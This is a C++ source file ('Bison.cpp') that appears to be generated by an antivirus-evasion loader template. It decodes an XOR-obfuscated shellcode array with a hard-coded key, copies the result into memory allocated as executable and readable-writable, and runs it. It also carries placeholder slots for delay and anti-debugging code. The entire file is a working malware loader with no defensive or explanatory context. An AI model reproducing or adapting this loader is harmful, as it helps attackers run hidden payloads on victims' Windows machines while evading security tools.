// Bison.cpp : Questo file contiene la funzione 'main', in cui inizia e termina l'esecuzione del programma.
//
#define _CRT_SECURE_NO_WARNINGS
#define MAX_ARGS 100
#define MAX_ARG_LENGTH 255

#include <windows.h>
#include <processenv.h>
#include <iostream>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

//####USING####

//####DEFINE####

int xor_encode_a2765fbd36564dc6a92c2e9e158ce30b(unsigned char* data, int data_len)
{
    const char* key = "SL(NYu,.zQgT";
    int key_len = 12;

    for (int i = 0; i < data_len; i++){
        data[i] = (data[i] ^ (unsigned char)key[i % key_len]);
    }
    return data_len;
}



DWORD WINAPI PsychoBlast(LPVOID lpParameter)
{
    DWORD dwSize;
    //HANDLE currentProcess;

    const unsigned char raw[] = {0xaf,0x04,0xab,0xaa,0xa9,0x9d,0xec,0x2e,0x7a,0x51,0x26,0x05,0x12,0x1c,0x7a,0x1f,0x0f,0x3d,0x1d,0xfc,0x1f,0x19,0xec,0x06,0x33,0x04,0xa3,0x1c,0x41,0x3d,0xa7,0x7c,0x5a,0x19,0xec,0x26,0x03,0x04,0x27,0xf9,0x13,0x3f,0x61,0x1f,0xb3,0x19,0x56,0x94,0xff,0x70,0x49,0x32,0x5b,0x59,0x0c,0x6f,0xbb,0x98,0x6a,0x15,0x52,0x8d,0xca,0xa3,0x0b,0x34,0x7d,0x66,0xf1,0x03,0x47,0xdf,0x11,0x70,0x60,0x4f,0x89,0xfe,0xac,0xa6,0x7a,0x51,0x67,0x1c,0xd6,0x8c,0x5c,0x29,0x11,0x74,0xfc,0x7e,0xf1,0x19,0x7f,0x10,0xd8,0x0c,0x08,0x07,0x58,0xa5,0xcf,0x78,0x32,0xae,0xae,0x15,0xd8,0x78,0xa0,0x06,0x58,0xa3,0x61,0x1f,0xb3,0x19,0x56,0x94,0xff,0x0d,0xe9,0x87,0x54,0x34,0x2d,0xef,0x42,0xb1,0x12,0xa5,0x1f,0x4f,0x64,0x6a,0x51,0x30,0x15,0xff,0x0f,0x89,0x3f,0x10,0xd8,0x0c,0x0c,0x07,0x58,0xa5,0x4a,0x6f,0xf1,0x5d,0x2f,0x10,0xd8,0x0c,0x34,0x07,0x58,0xa5,0x6d,0xa5,0x7e,0xd9,0x2f,0x55,0x83,0x0d,0x70,0x0f,0x01,0x2b,0x75,0x74,0x3b,0x09,0x26,0x0d,0x12,0x16,0x60,0xcd,0xb5,0x55,0x6d,0x7c,0x85,0xb1,0x3f,0x15,0x0a,0x16,0x60,0xc5,0x4b,0x9c,0x7b,0xd1,0x85,0xae,0x3a,0x1c,0xe9,0x4d,0x28,0x4e,0x59,0x75,0x2c,0x2e,0x7a,0x19,0xea,0xd9,0x52,0x4d,0x28,0x4e,0x18,0xcf,0x1d,0xa5,0x15,0xd6,0x98,0x81,0xe8,0xbc,0x9d,0xec,0x0f,0x34,0x96,0x88,0xef,0xec,0xfa,0xab,0x86,0x04,0xab,0x8a,0x71,0x49,0x2a,0x52,0x70,0xd1,0x9c,0xb4,0x26,0x49,0x93,0x09,0x4a,0x07,0x43,0x44,0x7a,0x08,0x26,0xdd,0x89,0xb3,0xfd,0x2d,0x38,0x19,0x4f,0x00,0x1f,0x29,0x02,0x54};
    int length = sizeof(raw);


    printf("\n");
    printf("sizeOfRaw: %d ",length);
    unsigned char* encoded = (unsigned char*)malloc(sizeof(unsigned char)*length*2);
    memcpy(encoded, raw, length);
    //SIZE_T bytesWritten;

    length = xor_encode_a2765fbd36564dc6a92c2e9e158ce30b(encoded, length);

    unsigned char* decoded = encoded;

    printf("\n");
    printf("DEBUG:After XOR:");
    for (size_t i = 0; i < length; i++) {
        printf("0x%02x,", decoded[i]);
    }
    printf("\n\n");

    //currentProcess = GetCurrentProcess();

    printf("[*] Allocating %d bytes of memory\n", length);
    void *exec = VirtualAlloc(0, length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (exec == NULL)
        return -1;

    bool success = false;
    success = memcpy(exec, decoded, length);
    if (!success){
        printf("[-] Oh gosh, something went wrong!\n");
        return -2;
    }
    
    int ret_val = 0;
    printf("[*] Executing\n");
    ((void (*)())exec)();
    
    printf("[+] The shellcode finished with a return value: %08X\n", ret_val);
    return 0;
}

int main()
{
    //####DELAY####
    //####ANTIDEBUG####
    //####ARGS####

    PsychoBlast(NULL);
}
